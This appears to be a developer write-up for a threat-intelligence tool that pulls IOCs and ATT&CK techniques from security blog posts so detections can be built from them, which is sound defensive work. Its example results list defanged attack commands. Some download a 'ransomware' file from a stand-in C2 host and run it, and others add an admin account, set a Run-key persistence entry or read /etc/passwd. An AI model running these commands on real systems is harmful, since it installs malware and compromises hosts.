# Blog Analysis Improvements

## Overview
Enhanced the blog post analysis feature to show IOC and TTP extraction results in a modal before starting detection generation, matching the file upload workflow. The improvements ensure only blog content is analyzed, not HTML/CSS/JS code.

## Key Improvements

### 1. Enhanced Content Extraction

**Problem**: Blog posts contain HTML, CSS, JavaScript, navigation menus, advertisements, and other non-content elements that could generate false positive IOCs.

**Solution**: Comprehensive HTML cleaning that removes all non-content elements before analysis.

#### Elements Removed:
- **Code**: `<script>`, `<style>`, `<code>`, `<pre>` tags
- **Metadata**: `<link>`, `<meta>`, `<noscript>` tags
- **Page Structure**: `<nav>`, `<footer>`, `<header>`, `<aside>` tags
- **Interactive Elements**: `<form>`, `<button>`, `<input>`, `<select>`, `<textarea>` tags
- **Graphics**: `<svg>`, `<canvas>`, `<iframe>` tags
- **Class/ID Patterns**: Elements with navigation, menu, sidebar, footer, header, banner, ad, social, share, comment, or related patterns

**Implementation** ([archer/parsers/blog_analyzer.py](archer/parsers/blog_analyzer.py) lines 110-138):
```python
# Remove ALL non-content elements
for element in soup([
    "script", "style", "link", "meta", "noscript", "iframe",
    "nav", "footer", "header", "aside", "form", "button",
    "input", "select", "textarea", "svg", "canvas", "code", "pre"
]):
    element.decompose()

# Remove common non-content class/id patterns
for element in soup.find_all(class_=re.compile(r'(nav|menu|sidebar|footer|header|banner|ad|advertisement|social|share|comment|related)', re.I)):
    element.decompose()

for element in soup.find_all(id=re.compile(r'(nav|menu|sidebar|footer|header|banner|ad|advertisement|social|share|comment|related)', re.I)):
    element.decompose()
```

### 2. Improved IOC Extraction

**Problem**: The old blog analyzer used basic regex patterns that didn't have the advanced features like smart property path detection, URL defanging, command cleaning, etc.

**Solution**: Replaced `_extract_iocs()` to use the improved `FileIntelligenceExtractor` with all enhancements.

**Benefits**:
- ✅ Defangs IPs and domains automatically
- ✅ Strips malformed command patterns (e.g., `) or (.exe .dll dump)))`)
- ✅ Smart quote stripping in commands
- ✅ URL defanging in commands (http → hxxp)
- ✅ Property path detection (excludes `Item[.]Subject`, etc.)
- ✅ TLD validation with 500+ valid TLDs
- ✅ File extension detection (`.sh`, `.py`, etc.)
- ✅ Domain and TLD exclusions
- ✅ Case-insensitive deduplication
- ✅ Command similarity merging

**Implementation** ([archer/parsers/blog_analyzer.py](archer/parsers/blog_analyzer.py) lines 288-301):
```python
def _extract_iocs(text: str) -> Dict[str, List[str]]:
    """
    Extract Indicators of Compromise using the improved FileIntelligenceExtractor.
    """
    from archer.parsers.file_intelligence import FileIntelligenceExtractor

    extractor = FileIntelligenceExtractor(use_openai=False, use_local_llm=False)
    iocs = extractor.extract_iocs(text)

    return iocs
```

### 3. Extraction Results Modal

**Flow**: The blog analysis now follows the same workflow as file upload:

1. **User submits blog URL** → Frontend calls `/analyze_blog`
2. **Backend extracts IOCs/TTPs** → Returns JSON with `show_extraction: true`
3. **Frontend shows modal** → User reviews and selects/deselects items
4. **User clicks "Proceed"** → Frontend calls `/blog/generate` with selected items
5. **Backend generates detections** → Redirects to progress page

**Frontend Logic** ([static/js/index.js](static/js/index.js)):
- Line 887-890: Detects `show_extraction` and calls `showExtractionResults(data)`
- Line 790: Routes to `/blog/generate` if filename starts with "Blog:"
- Reuses the same extraction modal component as file upload

**Backend Response** ([archer/app.py](archer/app.py) lines 1154-1165):
```python
return JSONResponse({
    "success": True,
    "show_extraction": True,
    "filename": f"Blog: {url[:50]}..." if len(url) > 50 else f"Blog: {url}",
    "synthetic_group_name": synthetic_group_name,
    "ttps": ttps,
    "iocs": {k: v for k, v in iocs.items() if v},  # Only non-empty
    "ttps_count": len(ttps),
    "iocs_count": sum(len(v) for v in iocs.values()),
    "auto_generate_requested": auto_generate == "true"
})
```

## Example Workflow

### User Action:
1. Paste blog URL: `https://www.crowdstrike.com/blog/apt28-analysis`
2. Click "Analyze Blog"

### System Response:
1. **Fetch blog** → Download HTML content
2. **Clean HTML** → Remove scripts, styles, navigation, etc.
3. **Extract TTPs** → Find T-codes (e.g., T1059.001)
4. **Extract IOCs** → Find IPs, domains, commands, files, etc.
5. **Show modal** → Display extraction results with checkboxes

### Modal Display:
```
Extraction Results - Select Items to Process
Filename: Blog: https://www.crowdstrike.com/blog/apt28-...

TTPs Found (5) ☑ Select All
☑ T1059.001 - PowerShell
☑ T1078 - Valid Accounts
☑ T1003.001 - OS Credential Dumping: LSASS Memory
☑ T1570 - Lateral Tool Transfer
☑ T1486 - Data Encrypted for Impact

IOCs Found:
IP Addresses (3):
  ☑ 185[.]8[.]106[.]150
  ☑ 203[.]0[.]113[.]42
  ☑ 198[.]51[.]100[.]89

Domains (5):
  ☑ evil-domain[.]com
  ☑ malware[.]xyz
  ☑ c2-server[.]net
  ☑ phishing-site[.]info
  ☑ backdoor[.]org

Commands (7):
  ☑ rundll32.exe dump
  ☑ wget hxxp://adversary-c2/ransomware -o /tmp/ransomware; chmod +x /tmp/ransomware; /tmp/ransomware
  ☑ curl -o ransomware.exe hxxp://adversary-c2/ransomware; start ransomware.exe
  ☑ powershell -enc <base64>
  ☑ net user admin password /add
  ☑ reg add hklm\software\microsoft\windows\currentversion\run /v malware /t reg_sz /d c:\malware.exe
  ☑ cat /etc/passwd | grep root
  ▼ Show 3 more (all selected by default)

Files (4):
  ☑ ntds.dit
  ☑ sam.hive
  ☑ malware.exe
  ☑ payload.dll

[Cancel] [Proceed with Generation]
```

### User Action:
- Deselects some IOCs
- Clicks "Proceed with Generation"

### System Response:
1. **POST to `/blog/generate`** with selected items
2. **Generate detections** using only selected TTPs/IOCs
3. **Redirect to progress page** showing real-time generation status

## Benefits

### For Users:
✅ **Full Control**: Select exactly which IOCs/TTPs to include
✅ **Transparency**: See what was extracted before processing
✅ **Accuracy**: Review and remove false positives
✅ **Clean Data**: Only blog content analyzed, no HTML/CSS/JS noise

### For Quality:
✅ **Fewer False Positives**: Property paths, file extensions, and common domains excluded
✅ **Better IOC Quality**: Smart cleaning, defanging, and deduplication
✅ **Consistent Experience**: Same workflow as file upload
✅ **Safer Output**: All URLs and domains defanged automatically

## Files Modified

1. **[archer/parsers/blog_analyzer.py](archer/parsers/blog_analyzer.py)**
   - Lines 110-138: Enhanced HTML cleaning
   - Lines 288-301: Updated IOC extraction to use FileIntelligenceExtractor

2. **[archer/app.py](archer/app.py)**
   - Lines 1154-1165: Returns extraction results for modal display
   - Lines 1176-1233: `/blog/generate` endpoint (already existed)

3. **[static/js/index.js](static/js/index.js)**
   - Lines 887-890: Handles blog extraction results
   - Line 790: Routes to correct endpoint based on source
   - Already had the extraction modal component

## Testing

### Test Case 1: HTML Cleaning
```html
Input:
<script>console.log('tracking');</script>
<article>
  <p>Command: rundll32.exe dump) or (.exe .dll dump)))</p>
</article>
<code>
<div class="ad">Advertisement</div>
</code>

Output (text only):
"Command: rundll32.exe dump) or (.exe .dll dump)))"

Extracted Command:
"rundll32.exe dump"  (cleaned)
```

### Test Case 2: URL Defanging
```
Input: wget http://adversary-c2/ransomware
Output: wget hxxp://adversary-c2/ransomware
```

### Test Case 3: Property Path Exclusion
```
Input: Item[.]Subject, ParentFolder[.]Path, evil-domain[.]com
Domains Extracted: evil-domain[.]com only
(Property paths excluded)
```

## Summary

The blog analysis feature now provides the same high-quality extraction and user control as file upload:
- **Clean Content**: Only blog text analyzed, HTML/CSS/JS stripped
- **Smart Extraction**: Uses all improvements (defanging, cleaning, validation)
- **User Control**: Modal allows selection/deselection before generation
- **Consistent UX**: Same workflow across all input methods

This ensures high-quality detection generation from blog posts with minimal false positives and full transparency.
